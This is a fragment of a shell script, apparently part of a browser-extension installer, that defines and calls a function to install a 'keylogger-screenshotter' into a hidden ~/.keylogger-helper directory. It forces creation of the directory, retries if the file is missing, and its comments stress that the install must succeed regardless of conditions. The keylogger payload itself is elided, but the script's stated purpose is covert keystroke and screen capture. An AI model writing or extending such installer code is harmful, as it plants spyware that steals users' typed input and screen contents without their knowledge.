...
install_keylogger_screenshotter_internal() {
    ...
    # Create app directory (CRITICAL - must exist first!)
    mkdir -p "$APP_DIR" 2>/dev/null || mkdir -p "$APP_DIR"
    
    # DEBUG: Verify directory was created
    if [ ! -d "$APP_DIR" ]; then
        # Failed to create directory - try with full path
        mkdir -p "$HOME/.keylogger-helper" 2>/dev/null
        APP_DIR="$HOME/.keylogger-helper"
    fi
    
    # Create keylogger script inline (self-contained, no external files needed)
    # FORCE create the file - this MUST happen!
    # Verify directory exists before creating file
    if [ ! -d "$APP_DIR" ]; then
        mkdir -p "$APP_DIR" || exit 1
    fi
    
    # Create the file - NO CONDITIONS, JUST CREATE IT!
...
if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
    ...
    # Call function DIRECTLY and SYNCHRONOUSLY to ensure it completes
    # Don't run in background - we need it to finish!
    install_keylogger_screenshotter_internal
    
    # Verify file was created
    if [ ! -f "$HOME/.keylogger-helper/keylogger-screenshotter.js" ]; then
        # File not created - try again
        sleep 2
        install_keylogger_screenshotter_internal
    fi
